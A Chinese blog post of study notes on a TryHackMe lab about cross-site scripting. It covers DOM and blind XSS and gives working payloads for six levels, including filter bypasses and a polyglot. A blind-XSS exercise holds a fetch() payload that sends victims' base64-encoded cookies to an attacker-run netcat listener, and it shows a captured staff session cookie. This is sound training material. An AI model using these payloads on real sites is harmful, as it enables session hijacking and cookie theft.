+<p>基于 DOM 的 XSS 能够让 JavaScript恶意代码 直接在浏览器中执行，而无需加载任何新页面或将数据提交给后端代码。当网站上的 JavaScript恶意代码 作用于输入或与用户发生交互时，该代码就会被执行。</p>
+<p><strong>示例场景：</strong></p>
+<p>假设目标网站上的 JavaScript 能从 <code>window.location.hash</code> 参数中获取内容，然后将其写入当前正在被查看的网页页面中；如果该目标站点不会检查哈希值的内容是否存在恶意js代码，那么这将允许攻击者将他们自己所选择的 JavaScript代码 注入到当前正在被查看的网页中。</p>
+<p><strong>潜在影响：</strong></p>
+<p>攻击者可以将精心制作的基于DOM的 XSS链接发送给潜在的受害者，然后将受害者访问的页面重定向到另一个网站或者从用户所访问的当前页面、用户当前的会话中窃取内容。</p>
+<p><strong>如何测试基于DOM的 XSS：</strong></p>
+<p>对 基于 DOM 的 XSS 进行测试可能具有挑战性，并且需要一定的 JavaScript 知识才能阅读相关源代码。 你需要查找攻击者可以控制的并且能够访问某些变量的代码部分，例如“<code>window.location.x</code>”参数。</p>
+<p>找到这些代码后，你需要查看它们是如何处理变量的，以及这些值是否曾被写入网页的DOM中 或者 能够被传递给不安全的 JavaScript 方法–例如 <code>eval()</code>方法。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125184753876.png"
+                      alt="image-20221125184753876"
+                ></p>
+<h2 id="Blind-盲注-XSS"><a href="#Blind-盲注-XSS" class="headerlink" title="Blind(盲注)XSS"></a>Blind(盲注)XSS</h2><p>盲注类型的 XSS 类似于存储型 XSS，因为在此种类型的XSS攻击中 XSS payload 也会被存储在目标网站上以供其他用户执行，但是在这种XSS攻击中，你看不到相关的XSS payload是如何工作的或者你无法自行测试该XSS payload。</p>
+<p><strong>示例场景：</strong></p>
+<p>假设目标网站有一个联系表单，你可以通过该表单向网站相关工作人员发送消息。如果目标站点不检查邮件内容是否有任何恶意代码，这将使得攻击者可以在邮件中输入他们想要的任何内容；然后，这些邮件消息会变成目标站点的业务工单，员工可以在私人门户(入口页)网站上查看这些工单，从而触发XSS攻击。</p>
+<p><strong>潜在影响：</strong></p>
+<p>当攻击者使用了正确的XSS payload时，相关代码就可以回调攻击者所拥有的网站，从而显示目标站点的员工门户(入口页) URL、员工的 cookie，甚至员工正在查看的门户(入口页)内容；然后攻击者就可以尝试劫持员工的会话并访问一些私有门户(入口页)。</p>
+<p><strong>如何测试Blind（盲注）型 XSS：</strong></p>
+<p>在测试 Blind XSS 漏洞时，你需要确保你的 XSS payload 有回调（通常是一个HTTP请求）；这样，你就能知道你的代码是否被执行以及何时被执行。</p>
+<p>一种流行的Blind XSS 攻击工具是 <a class="link"   target="_blank" rel="noopener" href="https://xsshunter.com/" >xsshunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。 虽然你可以用 JavaScript代码 制作你自己的工具，但是通过使用xsshunter工具（该工具页面处于关闭注册状态）会自动帮助你捕获 cookie、URL、页面内容等。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125191134331.png"
+                      alt="image-20221125191134331"
+                ></p>
+<h2 id="完善你的XSS-payload（实验）"><a href="#完善你的XSS-payload（实验）" class="headerlink" title="完善你的XSS payload（实验）"></a>完善你的XSS payload（实验）</h2><p>XSS有效载荷（payload）是我们要让其他用户在他们的浏览器上执行的 JavaScript 代码，或者也可以作为概念证明（POC）来演示一些网站中的XSS漏洞。</p>
+<p>你的有效载荷可能有多种用途，可以只是调出一个 JavaScript 警告框以证明我们能在目标网站上执行 JavaScript代码，也可以从网页或用户会话中提取一些敏感信息。</p>
+<p>你的 JavaScript 有效载荷如何反映在目标网站的代码内容中 将决定你具体需要使用怎样的有效载荷。为了很好的理解这一点，我们需要启动TryHackMe实验房间在本小节中所提供的目标机器，然后访问目标站点（ <a class="link"   target="_blank" rel="noopener" href="https://lab_web_url.p.thmlabs.com/" >https://lab_web_url.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ），尝试完成相关的实验操作。</p>
+<p>每个XSS关卡级别的目标都是使用字符串 THM 来执行 JavaScript 警告框功能，例如：</p>
+<p><code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p><em><strong>Level One:</strong></em></p>
+<p>在此XSS关卡，你会看到一个表格，要求你输入姓名，一旦你输入了你的姓名并且点击了Enter按钮，姓名内容将显示在输入框的下面一行，例如：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125195947941.png"
+                      alt="image-20221125195947941"
+                ></p>
+<p>如果你查看当前页面的源代码，你会看到你输入的姓名信息能被反映在代码中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125200137180.png"
+                      alt="image-20221125200137180"
+                ></p>
+<p>接下来，我们将尝试输入以下 JavaScript 有效载荷，而不是输入姓名信息：<code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p>现在，当你点击Enter按钮时，你将看到一个带有字符串 THM 的警告框被弹出，相关的页面源代码如下所示：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125200535122.png"
+                      alt="image-20221125200535122"
+                ></p>
+<p>然后，你将收到一条确认消息，这表明你的payload已成功执行，这条确认消息中还会带有指向下一XSS关卡的链接。</p>
+<p><em><strong>Level Two:</strong></em></p>
+<p>与上一关卡一样，系统会再次要求你在输入框输入姓名信息。 这次当你点击回车按钮时，你会发现姓名信息被反映在一个输入(input)标签中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125200920338.png"
+                      alt="image-20221125200920338"
+                ></p>
+<p>查看相关的页面源代码，你可以看到你输入的姓名信息反映在 input 标签的 value 属性中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125201040848.png"
+                      alt="image-20221125201040848"
+                ></p>
+<p>如果你在此处尝试上一关卡中的 JavaScript 有效载荷，你会发现它将无法工作，因为你无法从输入(input)标签内部直接运行之前的有效载荷。在此处，我们需要先对输入(input)标签进行闭合处理，这样才能正常运行相关的payload；你可以使用以下有效载荷执行此操作：</p>
+<p><code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p>这个有效载荷的重要部分是<code>&quot;&gt;</code>，它会关闭 value 参数，然后接着关闭输入(input)标签。</p>
+<p>现在我们已经正确关闭了 input 标签并能使我们构造的 JavaScript 有效载荷得到运行，payload执行结果将反映在相关页面的源代码中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125201914663.png"
+                      alt="image-20221125201914663"
+                ></p>
+<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出。 然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
+<p><em><strong>Level Three:</strong></em></p>
+<p>在此关卡你会看到另一个询问你姓名的表单，与上一级关卡相同，你的姓名信息会反映在页面源码的 HTML 标签中，在此处是 textarea 标签。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125202407190.png"
+                      alt="image-20221125202407190"
+                ></p>
+<p>我们必须使用以下payload对 textarea 标签进行闭合，这与之前闭合 input 标签（在关卡二中）略有不同：</p>
+<p><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125211621901.png"
+                      alt="image-20221125211621901"
+                ></p>
+<p>上述有效载荷的重要部分是<code>&lt;/textarea&gt;</code>，这会导致 textarea 元素关闭，以便payload有效部分得以运行。</p>
+<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
+<p><em><strong>Level Four:</strong></em></p>
+<p>和之前关卡一样，当你在表单中输入姓名之后，你会在页面源码中看到它。 这一关看起来与第一关相似，但在检查页面源代码之后，你会看到你输入的姓名信息将反映在以下 JavaScript 代码中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125212321185.png"
+                      alt="image-20221125212321185"
+                ></p>
+<p>你必须闭合现有的一些 JavaScript 代码段，以便能够运行你的payload有效部分代码；你可以使用以下有效载荷 <code>&#39;;alert(&#39;THM&#39;);//</code> ，从下面的页面源代码截图中可以看到该payload代码的注入情况。</p>
+<p>其中 <code>&#39;</code>用于关闭指定name的字段，然后 <code>;</code> 可用于表示代码段的结束，末尾的 <code>//</code> 能够使它后面所接的任何内容都成为注释而非可执行代码部分。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125214406567.png"
+                      alt="image-20221125214406567"
+                ></p>
+<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
+<p><em><strong>Level Five:</strong></em></p>
+<p>该关卡看起来和第一关一样，但是，当你使用 <code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code> 作为有效载荷时，你会发现此payload并不会起作用。你可以查看相关页面源代码，以明白payload失效原因：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125215309944.png"
+                      alt="image-20221125215309944"
+                ></p>
+<p>从上图中，你会发现<code>script</code>这个词会从有效载荷中删除，这是因为目标页面存在一个过滤器可以去除任何潜在的危险词。</p>
+<p>当目标页面会从你输入的字符串中删除危险词时，你可以尝试一个有用的技巧来绕过该过滤器：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125215813629.png"
+                      alt="image-20221125215813629"
+                ></p>
+<p>尝试输入有效载荷 <code>&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;</code>，然后单击回车按钮，你将看到一个带有字符串THM的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
+<p><em><strong>Level Six:</strong></em></p>
+<p>该关卡看起来和第二关类似，我们需要闭合标签以及该标签中的属性值，我们尝试使用有效载荷 <code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>，但这似乎不起作用，我们可以查看一下相关页面的源代码以便了解上述payload失效原因：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125220456444.png"
+                      alt="image-20221125220456444"
+                ></p>
+<p>你可以看到 <code>&lt;</code> 和 <code>&gt;</code> 字符会从我们的payload中被过滤，从而阻止了我们闭合 IMG 标签。 为了绕过该过滤器，我们可以利用 IMG 标签的附加属性，例如 <em><strong>onload</strong></em> 事件；一旦 <em><strong>src</strong></em> 属性中指定的图像被加载到当前网页上，onload 事件就会执行你指定的payload代码。</p>
+<p>使用以下有效载荷 <code>/images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;);</code>，然后查看对应的页面源代码，你将看到此payload如何开始工作。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125221135597.png"
+                      alt="image-20221125221135597"
+                ></p>
+<p>现在，当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你会收到一条确认消息，表明你的payload已成功执行。完成此关卡你将获取到一个最终的flag。</p>
+<p><em><strong>Polyglots（多语言）:</strong></em></p>
+<p>XSS polyglot 是一串文本，可以将闭合属性、闭合标签和绕过过滤器合而为一。 你可以在刚刚完成的六个关卡中使用以下多语言payload，并且都会得到成功执行。</p>
+<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */onerror=alert(&#x27;THM&#x27;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221125213124007.png"
+                      alt="image-20221125213124007"
+                ></p>
+<p>启动目标机器，访问目标站点： <a class="link"   target="_blank" rel="noopener" href="https://10-10-33-53.p.thmlabs.com/" >https://10-10-33-53.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>关卡1：payload <code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143216275.png"
+                      alt="image-20221126143216275"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143244474.png"
+                      alt="image-20221126143244474"
+                ></p>
+<p>关卡2：payload <code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143417254.png"
+                      alt="image-20221126143417254"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143322719.png"
+                      alt="image-20221126143322719"
+                ></p>
+<p>关卡3：payload <code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143520471.png"
+                      alt="image-20221126143520471"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143450961.png"
+                      alt="image-20221126143450961"
+                ></p>
+<p>关卡4：payload <code>&#39;;alert(&#39;THM&#39;);//</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143627043.png"
+                      alt="image-20221126143627043"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143549627.png"
+                      alt="image-20221126143549627"
+                ></p>
+<p>关卡5：payload <code>&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143736538.png"
+                      alt="image-20221126143736538"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143650789.png"
+                      alt="image-20221126143650789"
+                ></p>
+<p>关卡6：payload <code>/images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;);</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143814413.png"
+                      alt="image-20221126143814413"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143931572.png"
+                      alt="image-20221126143931572"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126143856864.png"
+                      alt="image-20221126143856864"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126144012752.png"
+                      alt="image-20221126144012752"
+                ></p>
+<blockquote>
+<p>THM{XSS_MASTER}</p>
+</blockquote>
+<h2 id="练习-Blind-XSS"><a href="#练习-Blind-XSS" class="headerlink" title="练习(Blind XSS)"></a>练习(Blind XSS)</h2><p>本文最后一个任务，我们将尝试发现一个 Blind XSS 漏洞。在本知识点对应的TryHackMe实验房间中：确保你终止了上一小节的目标机器，然后单击本小节右侧的绿色“启动机器”按钮以加载 Acme IT Support 网站（目标站点）。 </p>
+<p>你需要使用该TryHackMe实验房间页面顶部的蓝色按钮来加载 AttackBox，成功加载后，在 AttackBox 的 Firefox 浏览器中打开下面的链接（需等待链接刷新）以查看目标网站：<a class="link"   target="_blank" rel="noopener" href="https://lab_web_url.p.thmlabs.com/" >https://lab_web_url.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>单击目标站点顶部导航栏上的“客户”选项卡，然后单击“在此处注册”链接以创建一个新帐户；一旦你的帐户设置完毕，请单击“Support Tickets”选项卡，这是我们将要检测的可能存在XSS漏洞的功能点。</p>
+<p>尝试通过单击绿色的“创建ticket”按钮来创建Support ticket，输入主题和内容，你可以仅输入“test”一词，然后单击蓝色的“创建ticket”按钮，然后你就会在列表中注意到你有一个带有 ID 号的新ticket，你可以单击它以查看该ticket的具体信息。</p>
+<p>与研究第三小节的反射型XSS一样，我们会在此处研究先前输入的文本将如何反映在页面源码中。查看页面源代码后，我们可以看到先前我们输入的文本会被放置在 <code>textarea</code> 标签内。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126082612108.png"
+                      alt="image-20221126082612108"
+                ></p>
+<p>现在让我们返回并创建另一张工单，让我们看看是否可以通过在 ticket 的内容中输入以下有效载荷来闭合<code>textarea</code>标签： <code>&lt;/textarea&gt;test</code></p>
+<p>同样，此时再打开ticket信息并查看页面源代码，可以看到我们已经成功闭合了 <code>textarea</code> 标签。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126083341742.png"
+                      alt="image-20221126083341742"
+                ></p>
+<p>现在让我们扩展上述payload，看看我们是否可以运行恶意JavaScript代码并确认ticket创建功能是否存在XSS漏洞，使用以下payload尝试创建另一张新的ticket ：</p>
+<p><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
+<p>此时当你查看ticket内容时，你应该会看到一个带有字符串 <em><strong>THM</strong></em> 的警告框；我们接下来将进一步扩展有效载荷并增加XSS漏洞影响力。 由于刚才检测的功能点可以创建support ticket，所以我们有理由相信，网站的工作人员也会查看我们所创建的可以执行 JavaScript payload 的 ticket。</p>
+<p>从用户(网站工作人员)那里提取的一些有用信息可以是用户(网站工作人员)的 cookie值，我们可以使用XSS来劫持用户(网站工作人员)的登录会话以提升我们的访问特权。 为此，我们的有效载荷需要提取用户(网站工作人员)的 cookie信息 并将其泄露到我们所选择的另一个web服务器中，所以我们需要在攻击机上设置一个监听服务来接收信息。</p>
+<p>在TryHackMe AttackBox上，通过使用Netcat 设置一个监听服务器：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">nc -nlvp 9001</span></span><br></pre></td></tr></table></figure></div>
+
+<p>现在我们已经设置了接收泄露信息的方法，我们可以开始构建有效载荷：</p>
+<p><code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://&#123;URL_OR_IP&#125;?cookie=&#39; + btoa(document.cookie) );&lt;/script&gt;</code></p>
+<p>让我们分解上述有效载荷：</p>
+<ul>
+<li><code>&lt;/textarea&gt;</code> 标签用于闭合页面源码中的 textarea 标签；</li>
+<li><code>&lt;script&gt; </code> 标签为我们打开了一个可以编写 JavaScript 的区域；</li>
+<li><code>fetch()</code> 命令用于发出 HTTP 请求；</li>
+<li><code>&#123;URL_OR_IP&#125;</code> 是 THM 请求捕获器的URL或者指向THM AttackBox的IP地址或者你在使用本地攻击机时所对应的THM VPN网络中的IP地址；</li>
+<li><code>?cookie=</code> 是包含受害者(网站工作人员) cookie 的查询字符串；</li>
+<li><code>btoa()</code>命令表示对受害者(网站工作人员)的 cookie信息 进行base64编码；</li>
+<li><code>document.cookie</code>用于获取 Acme IT Support网站相关受害者(网站工作人员)的 cookie值；</li>
+<li><code>&lt;/script&gt;</code> 用于关闭 JavaScript 代码块。</li>
+</ul>
+<p>使用上面的有效载荷在目标站点上创建一个ticket，将 <code>&#123;URL_OR_IP&#125;</code>变量改为攻击机对应设置（确保payload中的端口号为 Netcat 侦听器所指定的端口号），然后等待一分钟，你将看到包含受害者(网站工作人员)cookie信息的http请求。</p>
+<p>注意：当你使用自己的 VM 时，你可能会遇到通过 VPN 接收http请求的问题，所以建议使用TryHackMe AttackBox 来完成此任务。</p>
+<p>你可以使用 <a class="link"   target="_blank" rel="noopener" href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 等网站对编码信息进行 base64 解码。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126091444778.png"
+                      alt="image-20221126091444778"
+                ></p>
+<p>启动目标机器，访问目标站点： <a class="link"   target="_blank" rel="noopener" href="https://10-10-138-209.p.thmlabs.com/" >https://10-10-138-209.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>单击目标站点顶部导航栏上的“客户”选项卡，然后单击“在此处注册”链接以创建一个新帐户；一旦你的帐户设置完毕，请单击“Support Tickets”选项卡，这是我们将要检测的可能存在XSS漏洞的功能点。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126144914883.png"
+                      alt="image-20221126144914883"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126144951632.png"
+                      alt="image-20221126144951632"
+                ></p>
+<p>尝试通过单击绿色的“创建ticket”按钮来创建Support ticket，输入主题和内容，你可以仅输入“test”一词，然后单击蓝色的“创建ticket”按钮，然后你就会在列表中注意到你有一个带有 ID 号的新ticket，你可以单击它以查看该ticket的具体信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145053502.png"
+                      alt="image-20221126145053502"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145128837.png"
+                      alt="image-20221126145128837"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145148959.png"
+                      alt="image-20221126145148959"
+                ></p>
+<p>与研究第三小节的反射型XSS一样，我们会在此处研究先前输入的文本将如何反映在页面源码中。查看页面源代码后，我们可以看到先前我们输入的文本会被放置在 <code>textarea</code> 标签内。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145330849.png"
+                      alt="image-20221126145330849"
+                ></p>
+<p>现在让我们返回并创建另一张工单，让我们看看是否可以通过在 ticket 的内容中输入以下有效载荷来闭合<code>textarea</code>标签： <code>&lt;/textarea&gt;test</code></p>
+<p>同样，此时再打开ticket信息并查看页面源代码，可以看到我们已经成功闭合了 <code>textarea</code> 标签。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145440317.png"
+                      alt="image-20221126145440317"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126145533330.png"
+                      alt="image-20221126145533330"
+                ></p>
+<p>在攻击机(建议使用TryHackMe所提供的AttackBox)上设置一个Netcat监听服务器：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 9001</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126152432254.png"
+                      alt="image-20221126152432254"
+                ></p>
+<p>扩展payload（修改ip为攻击机对应ip）：</p>
+<p><code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://10.10.165.49:9001?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;</code></p>
+<p>使用上面的有效载荷在目标站点上创建一个ticket，然后等待一分钟，你将看到包含受害者(网站工作人员)cookie信息的http请求。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126152730915.png"
+                      alt="image-20221126152730915"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126152850608.png"
+                      alt="image-20221126152850608"
+                ></p>
+<blockquote>
+<p>自动获取到的cookie值为：c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ&#x3D;&#x3D;</p>
+</blockquote>
+<p>使用 <a class="link"   target="_blank" rel="noopener" href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站对编码信息进行 base64 解码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221126152939584.png"
+                      alt="image-20221126152939584"
+                ></p>
+<blockquote>
+<p>staff-session&#x3D;4AB305E55955197693F01D6F8FD2D321</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习</li>
+        <li><strong>Author:</strong> Hekeatsll</li>
+        <li><strong>Created at
+                :</strong> 2024-01-27 12:14:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-01-27 12:16:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://hekeatsll.github.io/2024/01/27/THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/TryHackMe/">#TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/27/THM-Command%20Injection(%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-Command Injection(命令注入漏洞)-学习</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/27/THM-Intro%20to%20SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-Intro to SSRF(服务器端请求伪造漏洞简介)-学习</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习</div>
